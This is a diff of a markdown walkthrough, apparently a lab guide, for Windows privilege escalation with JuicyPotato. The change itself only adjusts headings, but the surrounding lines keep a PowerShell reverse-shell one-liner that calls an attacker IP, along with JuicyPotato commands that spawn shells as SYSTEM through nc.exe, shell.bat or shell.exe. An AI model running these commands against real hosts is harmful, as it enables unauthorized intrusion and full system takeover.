@@ -51,7 +51,7 @@ if "!RET!" == "1" set /a port=port+1
 )
 
 ```
-# Changes to Make
+### Changes to Make
 Note: C:\\Users\\Bob\\Desktop\\CLSID.list and C:\\Users\\Bob\\Desktop\\jp32.exe are the place where we gonna upload our CLSID.list file and jp32.exe (juicy potato 32-bit).
 
 
@@ -64,7 +64,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.x.x
 
 ```
 
-# Changes to make
+### Changes to make
 NOTE: '10.10.x.x',1234 is the attacker IP and listening port for our reverse shell.
 
 
@@ -91,9 +91,9 @@ We're insterested in SYSTEM CLSID. Grab one of SYSTEM CLSID.
 
 Now we've found valid CLSID for SYSTEM we can use that CLSID and get system shell.
 
-## Reverse Shell
+# Reverse Shell
 
-# Using Powershell shell.bat
+## Using Powershell shell.bat
 
 ```markdown
 
@@ -101,7 +101,7 @@ c:\\Users\\Bob\\Desktop\\JuicyPotato.exe -l 1234 -p c:\\Users\\Bob\\Desktop\\she
 
 ```
 
-# Using nc.exe
+## Using nc.exe
 
 ```markdown
 
@@ -109,7 +109,7 @@ c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/
 
 ```
 
-# Using shell.exe 
+## Using shell.exe 
 
 ```markdown
 
@@ -119,7 +119,7 @@ c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/
 
 ![OnPaste 20220606-195312](https://user-images.githubusercontent.com/106917304/172180304-91e48267-0a99-43cd-bd33-0f13c36c90d9.png)
 
-# Get Reverse Shell as SYSTEM
+## Get Reverse Shell as SYSTEM
 
 ![OnPaste 20220606-195431](https://user-images.githubusercontent.com/106917304/172180726-4bdb1672-1a35-4e06-8458-a873b49c6926.png)
 
